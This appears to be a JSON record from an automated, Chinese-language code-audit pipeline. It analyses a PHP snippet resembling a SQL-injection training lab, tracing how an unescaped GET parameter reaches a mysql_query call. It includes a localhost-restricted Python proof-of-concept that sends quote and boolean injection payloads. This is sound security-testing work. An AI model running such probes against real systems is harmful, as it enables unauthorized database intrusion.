@@ -1,0 +1,135 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-001",
+  "input_version": "v2",
+  "prompt_version": "v1",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-001"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "输入、拼接、执行与回显的静态证据完整：第8行直接取 GET 参数，第14行以单引号字符串插值进 SQL，第15行 mysql_query 执行，片段内未见转义、整数化、白名单或预处理防护；第16-23行与第28行分别提供结果回显和错误回显观察点。因未提供被 include 的连接文件与运行环境，且 POC 未运行，故 verdict 保持待验证。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-001-F1",
+      "vulnerability_type": "SQL注入",
+      "locations": [
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 8,
+          "line_end": 8,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 14,
+          "line_end": 14,
+          "quote": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 15,
+          "line_end": 15,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 20,
+          "line_end": 20,
+          "quote": "echo 'Your Login name:'. $row['username'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 28,
+          "line_end": 28,
+          "quote": "print_r(mysql_error());"
+        }
+      ],
+      "data_flow": [
+        "入口：第6行 isset($_GET['id']) 判断后，第8行 $id=$_GET['id'] 取原始 GET 参数，片段内未见类型校验、白名单或转义。",
+        "旁路处理：第10-12行把原始 id 追加写入 result.txt，仅是日志记录，不改变取值。",
+        "危险操作：第14行将 $id 直接插值进单引号包裹的 SQL 字符串，第15行用 mysql_query 执行，无参数化或预处理。",
+        "观察点1：第16-23行查询有结果时回显 username 与 password，可用于结果型/UNION 型注入的可见性判断。",
+        "观察点2：第28行无结果时 print_r(mysql_error()) 把数据库错误回显到页面，可用于报错型探测；error_reporting(0) 只影响 PHP 自身错误显示，不抑制该显式回显。"
+      ],
+      "principle": "用户输入 id 未经转义或参数化就拼接进 SELECT 语句的单引号字符串中，攻击者可通过闭合单引号改变 SQL 语义（布尔条件、UNION、报错函数等），使查询结果或错误信息偏离原始业务意图。",
+      "impact": "可绕过 id 过滤读取 users 表任意行（用户名、口令字段随查询结果回显），本片段存在直接的数据回显路径；错误回显进一步降低探测成本。影响限于该查询所用数据库账号的权限与 users 表范围内。",
+      "preconditions": [
+        "目标部署中入口接受 GET 参数 id，且请求能到达本片段（第6行条件成立）。",
+        "被 include 的连接文件 sql-connections/sql-connect.php 在调用前未对 $_GET 做全局转义或过滤（该文件未提供，需确认）。",
+        "运行环境仍提供 mysql_* 接口（PHP 5.x 或加载了兼容层），且 security 库可连接、users 表存在。",
+        "数据库账号对 users 表具有 SELECT 权限。",
+        "部署链路（Web 服务器、WAF、反向代理）未在 id 参数进入脚本前拦截单引号等注入字符（未提供配置）。"
+      ],
+      "counterexamples": [
+        "若 sql-connect.php 对 $_GET 统一执行 addslashes/mysql_real_escape_string 等转义，单引号会被转义，注入路径不成立。",
+        "若入口处对 id 做了强制整数化（intval/is_numeric）或白名单校验，则 payload 无法改变 SQL 结构；本片段未见此类处理。",
+        "若运行环境为 PHP 7.0+ 且未加载 mysql_* 兼容层，第15行无法执行，代码路径在运行期不可达。",
+        "若存在前置 WAF 或参数化重写规则拦截注入特征，则候选不可利用；需实际配置确认。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n\"\"\"SQLI-001 本地授权靶场 SQL 注入最小验证草案（需人工适配，未运行）。\n\n仅访问 localhost/127.0.0.1/::1，不跟随重定向，不枚举或导出数据；\n只发送基线、单引号探针和布尔真假对照，比较响应差异作为候选证据。\n\"\"\"\nimport argparse\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\nERROR_MARKERS = (\n    \"You have an error in your SQL syntax\",\n    \"Warning: mysql_\",\n    \"mysql_fetch_array()\",\n)\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    \"\"\"拒绝自动跟随 3xx，避免越出本地授权范围。\"\"\"\n\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        raise urllib.error.HTTPError(\n            req.full_url, code, \"redirect blocked: %s\" % newurl, headers, fp\n        )\n\n\ndef build_url(base_url, param, value):\n    parsed = urllib.parse.urlsplit(base_url)\n    if parsed.scheme not in (\"http\", \"https\"):\n        raise SystemExit(\"仅允许 http/https，当前为 %r\" % parsed.scheme)\n    if parsed.hostname not in ALLOWED_HOSTS:\n        raise SystemExit(\n            \"仅允许本地授权靶场主机（localhost/127.0.0.1/::1），当前为 %r\" % parsed.hostname\n        )\n    pairs = [\n        (k, v)\n        for (k, v) in urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)\n        if k != param\n    ]\n    pairs.append((param, value))\n    return urllib.parse.urlunsplit(\n        (\n            parsed.scheme,\n            parsed.netloc,\n            parsed.path,\n            urllib.parse.urlencode(pairs),\n            parsed.fragment,\n        )\n    )\n\n\ndef fetch(opener, url, timeout):\n    req = urllib.request.Request(url, headers={\"User-Agent\": \"sqli-001-lab-poc\"})\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            return resp.status, resp.read(300000).decode(\"utf-8\", \"replace\")\n    except urllib.error.HTTPError as exc:\n        body = exc.read(300000) if exc.fp is not None else b\"\"\n        return exc.code, body.decode(\"utf-8\", \"replace\")\n    except urllib.error.URLError as exc:\n        return None, \"连接错误: %r\" % (exc.reason,)\n    except OSError as exc:\n        return None, \"网络/协议错误: %r\" % (exc,)\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"SQLI-001 本地 SQL 注入最小验证草案\")\n    parser.add_argument(\"--base-url\", required=True, help=\"本地靶场入口 URL（仅本地主机）\")\n    parser.add_argument(\"--param\", default=\"id\", help=\"注入参数名，默认 id\")\n    parser.add_argument(\"--timeout\", type=float, default=10.0, help=\"请求超时秒数，默认 10\")\n    parser.add_argument(\"--repeat\", type=int, default=3, help=\"每个用例重复次数，默认 3\")\n    args = parser.parse_args()\n\n    cases = [\n        (\"基线\", \"1\"),\n        (\"单引号探针\", \"1'\"),\n        (\"布尔真\", \"1' AND '1'='1\"),\n        (\"布尔假\", \"1' AND '1'='2\"),\n    ]\n\n    opener = urllib.request.build_opener(NoRedirect)\n    summary = {}\n    for label, value in cases:\n        url = build_url(args.base_url, args.param, value)\n        lengths = []\n        statuses = set()\n        markers = set()\n        for _ in range(max(1, args.repeat)):\n            status, body = fetch(opener, url, args.timeout)\n            statuses.add(status)\n            lengths.append(len(body))\n            for marker in ERROR_MARKERS:\n                if marker in body:\n                    markers.add(marker)\n        summary[label] = {\n            \"statuses\": sorted(x for x in statuses if x is not None),\n            \"lengths\": lengths,\n            \"markers\": sorted(markers),\n        }\n        print(\n            \"[%s] param=%r status=%s lengths=%s error_markers=%s\"\n            % (label, value, summary[label][\"statuses\"], lengths, summary[label][\"markers\"])\n        )\n\n    baseline = summary[\"基线\"]\n    probe = summary[\"单引号探针\"]\n    true_case = summary[\"布尔真\"]\n    false_case = summary[\"布尔假\"]\n\n    print(\"\\n=== 观察汇总（不代表漏洞已确认）===\")\n    if probe[\"markers\"]:\n        print(\"单引号探针触发数据库错误回显标记：%s\" % probe[\"markers\"])\n    else:\n        print(\"单引号探针未出现已登记的错误回显标记。\")\n    avg_true = sum(true_case[\"lengths\"]) / len(true_case[\"lengths\"])\n    avg_false = sum(false_case[\"lengths\"]) / len(false_case[\"lengths\"])\n    print(\"布尔真与布尔假平均响应长度差：%.1f 字节\" % (avg_true - avg_false))\n    stable = len(set(true_case[\"lengths\"])) == 1 and len(set(false_case[\"lengths\"])) == 1\n    print(\"重复请求长度稳定性：%s\" % (\"稳定\" if stable else \"不稳定，需增加重复次数或检查缓存/随机内容\"))\n    if not baseline[\"statuses\"]:\n        print(\"基线请求未获得有效 HTTP 响应，请先确认靶场已启动且 --base-url 正确。\")\n        return 2\n    print(\"以上差异仅为静态候选的初步观察；是否成立需按工作包3的条件核验。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+（仅标准库：urllib、argparse、urllib.parse）",
+          "已部署并可访问的本地授权靶场（本草案不包含部署步骤）"
+        ],
+        "parameters": [
+          "--base-url：本地靶场入口 URL，主机必须是 localhost、127.0.0.1 或 ::1",
+          "--param：注入参数名，默认 id",
+          "--timeout：单次请求超时秒数，默认 10",
+          "--repeat：每个用例重复次数，默认 3，用于检查响应差异是否稳定"
+        ],
+        "steps": [
+          "在本地授权环境启动靶场，确认入口接受 GET 参数 id。",
+          "运行脚本：python sqli_001_poc.py --base-url http://127.0.0.1:8080/... --param id。",
+          "确认“基线”请求返回正常结果，作为后续对照。",
+          "观察“单引号探针”是否出现数据库错误回显标记。",
+          "比较“布尔真”与“布尔假”的响应长度/内容差异，并用 --repeat 检查稳定性。",
+          "若出现稳定差异，按工作包3的条件在相同环境复核；HTTP 200 或脚本运行成功本身不作为确认依据。"
+        ],
+        "expected_observation": "基线请求返回 users 表首行结果；单引号探针可能触发数据库语法错误并使页面回显错误信息（对应第28行 print_r(mysql_error()) 路径）；布尔真与布尔假请求可能出现响应长度或内容差异。若四类请求无差异，则本次未观察到注入证据。",
+        "success_criteria": "在相同 base-url、参数名、会话和请求头条件下：(1) 基线请求正常返回 users 表结果作为对照；(2) 布尔真与布尔假的响应存在可重复的稳定差异（响应长度差或登录名出现与否），或单引号请求出现数据库错误回显标记。仅 HTTP 200、脚本无异常或响应出现输入标记均不构成成功条件。",
+        "limitations": [
+          "草案未运行，execution_status=未运行，无 runtime_evidence，不能声称已观察到注入效果。",
+          "草案只做不导出数据的布尔/错误探测，未适配 UNION 列数与数据库类型。",
+          "users 表列结构、DBMS 类型和错误显示配置未知，ERROR_MARKERS 可能需要按实际响应增补。",
+          "响应正文可能含 users 表口令字段，草案刻意只输出长度与错误标记、不打印正文，以免导出数据。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "被 include 的 sql-connections/sql-connect.php / context/sqli-connect.php 实现未提供，无法确认连接层是否统一转义或过滤 $_GET。",
+    "db-creds.inc 的数据库账号与权限未提供，无法确定 users 表可读范围。",
+    "PHP 版本与 mysql_* 扩展可用性、MySQL/MariaDB 版本及 sql_mode 未提供。",
+    "security 库 users 表的列数与列类型未知，影响 UNION 型 payload 的列对齐，但不影响布尔/报错型探测。",
+    "部署层 Web 服务器、WAF、反向代理与难度/过滤配置未提供。",
+    "未采集真实运行环境与响应，无法给出确认级结论。"
+  ],
+  "risk_notes": [
+    "第10-12行把未净化的 id 原样追加写入 result.txt；若该文件位于 Web 可访问目录，存在日志注入与输入留存风险，属范围外一般风险。",
+    "第28行将 mysql_error() 直接输出到响应，构成数据库错误信息泄露，可辅助注入探测。",
+    "第20-22行直接回显 users 表的 username/password 字段，一旦注入成立会放大数据泄露面。"
+  ],
+  "quality_notes": [
+    "使用已在 PHP 7.0+ 移除的 mysql_* 接口，属过时 API，难以在现代环境部署。",
+    "error_reporting(0) 全局关闭错误报告，掩盖运行期问题，但不抑制第28行显式的 mysql_error() 回显。",
+    "缺少输入类型校验（如 intval/is_numeric）与预处理语句（PDO/mysqli）等基础防护。"
+  ],
+  "limitations": [
+    "结论仅基于提供的标准化代码片段，未包含被 include 的连接文件，未验证运行环境。",
+    "POC 草案未执行，未获得任何响应、差异或报错证据，不能声称注入成功或已观察到效果。",
+    "未验证 UNION 列数、DBMS 类型与 WAF 行为，payload 需按目标环境人工适配。",
+    "排除范围仅限本片段已覆盖的路径，不宣称整个项目安全。"
+  ],
+  "runtime_evidence": []
+}
